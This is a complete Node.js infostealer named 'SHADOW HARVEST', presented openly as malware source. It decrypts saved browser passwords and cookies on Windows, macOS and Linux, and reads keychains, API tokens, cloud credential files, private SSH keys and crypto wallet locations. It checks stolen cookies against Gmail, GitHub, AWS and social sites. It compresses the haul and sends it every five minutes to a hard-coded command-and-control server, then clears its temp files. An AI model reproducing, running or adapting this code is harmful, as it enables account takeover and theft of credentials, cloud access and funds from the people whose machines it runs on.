#!/usr/bin/env node
// ============================================
// SHADOW HARVEST - Main Harvester
// Cross-platform credential and session stealer
// ============================================

const os = require("os");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { execSync, spawnSync } = require("child_process");
const https = require("https");
const http = require("http");
const zlib = require("zlib");
const { URL } = require("url");

// Load dependencies (optional)
let Database = null;
try { Database = require("better-sqlite3"); } catch (e) {
  try { Database = require("sqlite3"); } catch (e2) {}
}
let keytar = null;
try { keytar = require("keytar"); } catch (e) {}
let CryptoJS = null;
try { CryptoJS = require("crypto-js"); } catch (e) {}

// Configuration
const CONFIG = {
  c2Server: "http://192.168.1.47:8080",
  apiEndpoint: "/api/collect",
  dashboardEndpoint: "/api/status",
  exfilInterval: 300000, // 5 minutes
  maxRetries: 5,
  stealth: true,
  selfDestruct: false,
};

// ============================================
// OS DETECTION
// ============================================
class OSDetector {
  constructor() {
    this.platform = os.platform();
    this.type = this.detect();
  }

  detect() {
    switch (this.platform) {
      case "win32": return "windows";
      case "darwin": return "macos";
      case "linux": return "linux";
      default: return "unknown";
    }
  }

  getBrowserPaths() {
    const home = os.homedir();
    if (this.type === "windows") {
      const local = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
      const roaming = process.env.APPDATA || path.join(home, "AppData", "Roaming");
      return {
        chrome: [path.join(local, "Google", "Chrome", "User Data")],
        edge: [path.join(local, "Microsoft", "Edge", "User Data")],
        brave: [path.join(local, "BraveSoftware", "Brave-Browser", "User Data")],
        opera: [path.join(roaming, "Opera Software", "Opera Stable")],
        firefox: [path.join(roaming, "Mozilla", "Firefox", "Profiles")],
      };
    } else if (this.type === "macos") {
      return {
        chrome: [path.join(home, "Library", "Application Support", "Google", "Chrome")],
        brave: [path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, "Library", "Application Support", "Firefox", "Profiles")],
        safari: [path.join(home, "Library", "Safari")],
      };
    } else if (this.type === "linux") {
      return {
        chrome: [path.join(home, ".config", "google-chrome")],
        chromium: [path.join(home, ".config", "chromium")],
        brave: [path.join(home, ".config", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, ".mozilla", "firefox")],
      };
    }
    return {};
  }
}

// ============================================
// WINDOWS DPAPI DECRYPTION
// ============================================
class WindowsDecryptor {
  getMasterKey(localStatePath) {
    try {
      const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
      const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64");
      const encryptedData = encryptedKey.slice(5);

      // Use PowerShell to call DPAPI
      const psScript = `
        Add-Type -AssemblyName System.Security
        $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
        [Convert]::ToBase64String($decrypted)
      `;
      const output = execSync(
        `powershell -NoProfile -NonInteractive -Command "${psScript.replace(/"/g, '\\"').replace(/\n/g, " ")}"`,
        { encoding: "utf8", windowsHide: true }
      );
      return Buffer.from(output.trim(), "base64");
    } catch (e) {
      return null;
    }
  }

  decryptValue(encryptedValue, masterKey) {
    try {
      const prefix = encryptedValue.slice(0, 3).toString();
      if (prefix === "v10" || prefix === "v11") {
        const nonce = encryptedValue.slice(3, 15);
        const ciphertextTag = encryptedValue.slice(15);
        const tag = ciphertextTag.slice(-16);
        const ciphertext = ciphertextTag.slice(0, -16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, nonce);
        decipher.setAuthTag(tag);
        let decrypted = decipher.update(ciphertext, null, "utf8");
        decrypted += decipher.final("utf8");
        return decrypted;
      }
    } catch (e) {}
    return "";
  }
}

// ============================================
// macOS KEYCHAIN DECRYPTION
// ============================================
class MacDecryptor {
  readKeychain() {
    const credentials = [];
    try {
      const output = execSync("security dump-keychain", { encoding: "utf8" });
      const lines = output.split("\n");
      let current = {};
      for (const line of lines) {
        if (line.includes("class") && line.includes("genp")) {
          if (Object.keys(current).length > 0) credentials.push(current);
          current = {};
        }
        if (line.includes("acct") && line.includes("=")) {
          current.username = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("srvr") && line.includes("=")) {
          current.service = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("data") && line.includes("=")) {
          current.password = line.split("=")[1].trim().replace(/"/g, "");
        }
      }
      if (Object.keys(current).length > 0) credentials.push(current);
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// LINUX LIBSECRET / KWALLET
// ============================================
class LinuxDecryptor {
  readLibsecret() {
    const credentials = [];
    if (keytar) {
      try {
        const services = ["chrome", "firefox", "chromium", "brave", "default"];
        for (const service of services) {
          const accounts = keytar.findCredentials(service);
          for (const account of accounts) {
            credentials.push({
              service: service,
              username: account.account,
              password: account.password,
            });
          }
        }
      } catch (e) {}
    }
    return credentials;
  }

  readKwallet() {
    const credentials = [];
    try {
      const output = execSync("kwallet-query --read-all kdewallet", { encoding: "utf8" });
      for (const line of output.split("\n")) {
        if (line.includes("=")) {
          const [key, value] = line.split("=");
          credentials.push({
            service: "kwallet",
            username: key.trim(),
            password: value.trim(),
          });
        }
      }
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// BROWSER DATA EXTRACTOR
// ============================================
class BrowserExtractor {
  constructor(osDetector) {
    this.osDetector = osDetector;
    this.decryptor = this.getDecryptor();
  }

  getDecryptor() {
    if (this.osDetector.type === "windows") return new WindowsDecryptor();
    if (this.osDetector.type === "macos") return new MacDecryptor();
    if (this.osDetector.type === "linux") return new LinuxDecryptor();
    return null;
  }

  extractPasswords(browser, browserPath) {
    const credentials = [];
    const loginDb = path.join(browserPath, "Login Data");
    if (!fs.existsSync(loginDb)) return credentials;

    try {
      const tempDb = path.join(os.tmpdir(), `login_${Date.now()}.db`);
      fs.copyFileSync(loginDb, tempDb);

      let rows = [];
      if (Database) {
        const db = new Database(tempDb, { readonly: true });
        try {
          rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
        } catch (e) {
          try {
            rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
          } catch (e2) {}
        }
        db.close();
      }

      for (const row of rows) {
        const { origin_url, username_value, password_value } = row;
        let password = "";

        if (this.osDetector.type === "windows" && this.decryptor) {
          const localState = path.join(browserPath, "Local State");
          if (fs.existsSync(localState)) {
            const masterKey = this.decryptor.getMasterKey(localState);
            if (masterKey && password_value) {
              password = this.decryptor.decryptValue(Buffer.from(password_value), masterKey);
            }
          }
        } else if (this.osDetector.type === "macos" && this.decryptor) {
          const keychainCreds = this.decryptor.readKeychain();
          for (const cred of keychainCreds) {
            if (origin_url.includes(cred.service)) {
              password = cred.password || "";
              break;
            }
          }
        } else if (this.osDetector.type === "linux" && this.decryptor) {
          const creds = this.decryptor.readLibsecret();
          for (const cred of creds) {
            if (origin_url.includes(cred.service)) {
              password = cred.password || "";
              break;
            }
          }
        }

        if (username_value || password) {
          credentials.push({
            url: origin_url,
            username: username_value,
            password: password,
          });
        }
      }

      fs.unlinkSync(tempDb);
    } catch (e) {}
    return credentials;
  }

  extractCookies(browser, browserPath) {
    const cookies = [];
    let cookieDb = path.join(browserPath, "Cookies");
    if (!fs.existsSync(cookieDb)) {
      cookieDb = path.join(browserPath, "cookies.sqlite");
    }
    if (!fs.existsSync(cookieDb)) return cookies;

    try {
      const tempDb = path.join(os.tmpdir(), `cookie_${Date.now()}.db`);
      fs.copyFileSync(cookieDb, tempDb);

      let rows = [];
      if (Database) {
        const db = new Database(tempDb, { readonly: true });
        try {
          rows = db.prepare("SELECT host_key, name, encrypted_value FROM cookies").all();
        } catch (e) {
          try {
            rows = db.prepare("SELECT host, name, value FROM moz_cookies").all();
          } catch (e2) {}
        }
        db.close();
      }

      for (const row of rows) {
        const { host_key, name, encrypted_value } = row;
        let value = "";

        if (this.osDetector.type === "windows" && this.decryptor) {
          const localState = path.join(browserPath, "Local State");
          if (fs.existsSync(localState)) {
            const masterKey = this.decryptor.getMasterKey(localState);
            if (masterKey && encrypted_value) {
              value = this.decryptor.decryptValue(Buffer.from(encrypted_value), masterKey);
            }
          }
        } else if (row.value) {
          value = row.value;
        }

        if (value) {
          cookies.push({
            host: host_key || row.host,
            name: name,
            value: value,
          });
        }
      }

      fs.unlinkSync(tempDb);
    } catch (e) {}
    return cookies;
  }
}

// ============================================
// TOKEN EXTRACTOR
// ============================================
class TokenExtractor {
  constructor() {
    this.home = os.homedir();
  }

  extract() {
    const tokens = [];
    const envVars = [
      "GITHUB_TOKEN", "GITLAB_TOKEN", "AWS_ACCESS_KEY_ID",
      "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
      "GOOGLE_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
      "SLACK_TOKEN", "DISCORD_TOKEN", "TWITTER_API_KEY",
      "TWITTER_API_SECRET", "FACEBOOK_ACCESS_TOKEN",
      "INSTAGRAM_ACCESS_TOKEN", "LINKEDIN_TOKEN",
      "MICROSOFT_GRAPH_TOKEN", "AZURE_ACCESS_TOKEN",
    ];

    for (const varName of envVars) {
      if (process.env[varName]) {
        tokens.push({ name: varName, value: process.env[varName] });
      }
    }

    const tokenFiles = [
      path.join(this.home, ".git-credentials"),
      path.join(this.home, ".netrc"),
      path.join(this.home, ".npmrc"),
      path.join(this.home, ".pypirc"),
      path.join(this.home, ".config", "gh", "hosts.yml"),
      path.join(this.home, ".docker", "config.json"),
      path.join(this.home, ".aws", "credentials"),
    ];

    for (const filePath of tokenFiles) {
      if (fs.existsSync(filePath)) {
        try {
          tokens.push({ name: filePath, value: fs.readFileSync(filePath, "utf8") });
        } catch (e) {}
      }
    }

    return tokens;
  }
}

// ============================================
// SSH KEY HARVESTER
// ============================================
class SSHKeyHarvester {
  constructor() {
    this.sshDir = path.join(os.homedir(), ".ssh");
  }

  collect() {
    const keys = [];
    if (!fs.existsSync(this.sshDir)) return keys;

    for (const file of fs.readdirSync(this.sshDir)) {
      const filePath = path.join(this.sshDir, file);
      if (fs.statSync(filePath).isFile() && !file.endsWith(".pub")) {
        const content = fs.readFileSync(filePath, "utf8");
        if (content.includes("PRIVATE KEY")) {
          keys.push({ path: filePath, content: content });
        }
      }
    }
    return keys;
  }
}

// ============================================
// CLOUD CREDENTIAL HARVESTER
// ============================================
class CloudCredentialHarvester {
  constructor() {
    this.home = os.homedir();
  }

  collect() {
    const creds = [];
    const awsCreds = path.join(this.home, ".aws", "credentials");
    if (fs.existsSync(awsCreds)) {
      creds.push({ service: "aws", file: awsCreds, content: fs.readFileSync(awsCreds, "utf8") });
    }

    const gcpDir = path.join(this.home, ".config", "gcloud");
    if (fs.existsSync(gcpDir)) {
      creds.push({ service: "gcp", file: gcpDir, content: "EXISTS" });
    }

    const azureDir = path.join(this.home, ".azure");
    if (fs.existsSync(azureDir)) {
      const walk = (dir) => {
        for (const file of fs.readdirSync(dir)) {
          const filePath = path.join(dir, file);
          if (fs.statSync(filePath).isDirectory()) walk(filePath);
          else {
            try {
              creds.push({ service: "azure", file: filePath, content: fs.readFileSync(filePath, "utf8") });
            } catch (e) {}
          }
        }
      };
      walk(azureDir);
    }

    return creds;
  }
}

// ============================================
// CRYPTO WALLET HARVESTER
// ============================================
class CryptoWalletHarvester {
  constructor() {
    this.home = os.homedir();
  }

  collect() {
    const wallets = [];
    const walletPaths = [
      path.join(this.home, ".bitcoin", "wallet.dat"),
      path.join(this.home, ".ethereum", "keystore"),
      path.join(this.home, ".electrum", "wallets"),
      path.join(this.home, ".config", "metamask"),
      path.join(this.home, "AppData", "Roaming", "Bitcoin", "wallet.dat"),
      path.join(this.home, "Library", "Application Support", "Bitcoin", "wallet.dat"),
    ];

    for (const walletPath of walletPaths) {
      if (fs.existsSync(walletPath)) {
        wallets.push({ path: walletPath, type: "crypto_wallet", content: "EXISTS" });
      }
    }
    return wallets;
  }
}

// ============================================
// SESSION VALIDATOR
// ============================================
class SessionValidator {
  constructor() {
    this.targets = {
      gmail: "https://mail.google.com/mail/u/0/",
      github: "https://github.com/settings/profile",
      aws: "https://console.aws.amazon.com/console/home",
      gcp: "https://console.cloud.google.com/",
      azure: "https://portal.azure.com/",
      facebook: "https://www.facebook.com/me",
      twitter: "https://twitter.com/settings/account",
      instagram: "https://www.instagram.com/accounts/edit/",
      linkedin: "https://www.linkedin.com/feed/",
    };
  }

  validateCookie(cookie) {
    const results = {};
    const cookieHeader = `${cookie.name}=${cookie.value}`;

    for (const [service, url] of Object.entries(this.targets)) {
      try {
        const parsed = new URL(url);
        const options = {
          hostname: parsed.hostname,
          path: parsed.pathname,
          method: "GET",
          headers: {
            Cookie: cookieHeader,
            "User-Agent": "Mozilla/5.0",
          },
        };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) results[service] = "VALID";
          else if (res.statusCode === 302) results[service] = "REDIRECTED";
          else results[service] = `HTTP_${res.statusCode}`;
        });
        req.on("error", () => { results[service] = "ERROR"; });
        req.setTimeout(5000, () => { req.destroy(); results[service] = "TIMEOUT"; });
        req.end();
      } catch (e) {
        results[service] = "ERROR";
      }
    }
    return results;
  }
}

// ============================================
// EXFILTRATION MODULE
// ============================================
class Exfiltrator {
  constructor(config) {
    this.config = config;
  }

  packageData(data) {
    const jsonData = JSON.stringify(data, null, 2);
    const compressed = zlib.gzipSync(jsonData);
    return compressed;
  }

  sendHTTPS(data) {
    const compressed = this.packageData(data);
    const options = {
      hostname: "192.168.1.47",
      port: 8080,
      path: "/api/collect",
      method: "POST",
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Length": compressed.length,
      },
    };

    return new Promise((resolve, reject) => {
      const req = http.request(options, (res) => {
        if (res.statusCode === 200) resolve(true);
        else reject(new Error(`HTTP ${res.statusCode}`));
      });
      req.on("error", reject);
      req.write(compressed);
      req.end();
    });
  }

  clearTraces() {
    const tempDir = os.tmpdir();
    for (const file of fs.readdirSync(tempDir)) {
      if (file.startsWith("login_") || file.startsWith("cookie_")) {
        try { fs.unlinkSync(path.join(tempDir, file)); } catch (e) {}
      }
    }
  }
}

// ============================================
// MAIN HARVESTER CLASS
// ============================================
class MainHarvester {
  constructor() {
    this.config = CONFIG;
    this.osDetector = new OSDetector();
    this.browserExtractor = new BrowserExtractor(this.osDetector);
    this.tokenExtractor = new TokenExtractor();
    this.sshHarvester = new SSHKeyHarvester();
    this.cloudHarvester = new CloudCredentialHarvester();
    this.cryptoHarvester = new CryptoWalletHarvester();
    this.sessionValidator = new SessionValidator();
    this.exfiltrator = new Exfiltrator(this.config);
  }

  collectData() {
    const allData = {
      timestamp: new Date().toISOString(),
      os: this.osDetector.type,
      hostname: os.hostname(),
      username: os.userInfo().username,
      ip: this.getLocalIP(),
      passwords: [],
      cookies: [],
      valid_sessions: [],
      tokens: [],
      ssh_keys: [],
      cloud_credentials: [],
      crypto_wallets: [],
    };

    const browserPaths = this.osDetector.getBrowserPaths();
    for (const [browser, paths] of Object.entries(browserPaths)) {
      for (const browserPath of paths) {
        const passwords = this.browserExtractor.extractPasswords(browser, browserPath);
        allData.passwords.push(...passwords);

        const cookies = this.browserExtractor.extractCookies(browser, browserPath);
        allData.cookies.push(...cookies);

        for (const cookie of cookies) {
          const validation = this.sessionValidator.validateCookie(cookie);
          if (Object.values(validation).includes("VALID")) {
            allData.valid_sessions.push({ cookie, validation });
          }
        }
      }
    }

    allData.tokens = this.tokenExtractor.extract();
    allData.ssh_keys = this.sshHarvester.collect();
    allData.cloud_credentials = this.cloudHarvester.collect();
    allData.crypto_wallets = this.cryptoHarvester.collect();

    return allData;
  }

  getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === "IPv4" && !iface.internal) {
          return iface.address;
        }
      }
    }
    return "unknown";
  }

  run() {
    try {
      const data = this.collectData();
      this.exfiltrator.sendHTTPS(data);
      this.exfiltrator.clearTraces();
      return data;
    } catch (e) {
      return null;
    }
  }
}

// ============================================
// EXECUTION LOOP
// ============================================
if (require.main === module) {
  const harvester = new MainHarvester();
  const interval = setInterval(() => {
    harvester.run();
  }, CONFIG.exfilInterval);

  // Run immediately on start
  harvester.run();

  // Keep process alive
  process.on("SIGINT", () => {
    clearInterval(interval);
    process.exit(0);
  });
}

module.exports = MainHarvester;